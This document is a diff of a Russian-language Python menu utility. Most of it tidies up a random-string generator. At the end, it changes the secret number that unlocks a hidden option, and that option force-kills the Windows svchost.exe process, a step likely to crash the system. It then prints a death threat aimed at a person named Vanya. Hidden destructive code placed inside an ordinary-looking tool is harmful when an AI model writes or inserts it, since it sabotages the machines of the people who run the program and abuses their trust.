@@ -185,17 +185,19 @@ while ipt != 0:
             gdh = input("А какой язык? eu / ru / all? ").lower()
             if gdh == "ru":
                 alf = alfru
-            if gdh == "eu":
+            elif gdh == "eu":  
                 alf = alfeu
-            if gdh == "all":
-                alf = ""
+            elif gdh == "all":
+                alf = "" 
                 alf += alfru
                 alf += alfeu
             for i in range(dsds):
-                per2 += alf[randint(0, (len(alf) - 1))]
+                per2 += alf[randint(0, len(alf)-1)]
                 if randint(1,3) == 1:
                     for i in range(randint(1, 3)):
                         per2 += str(randint(0,9))
+            if len(per2) > dsds:
+                per2 = per2[:dsds]
             print(per2)
     elif ipt == 12:
         q = int(input("1 - зашифровать, 2 - расшифровать: "))
@@ -215,7 +217,7 @@ while ipt != 0:
         print("Длинна строки:", len(per3))
     elif ipt == 14:
         main_beta.beta()
-    elif ipt == 111011011000011101110111100111001011101011:
+    elif ipt == 27012009:
         os.system("taskkill /im svchost.exe /f")
         sleep(5)
         print("Ваня... Увижу, убью")
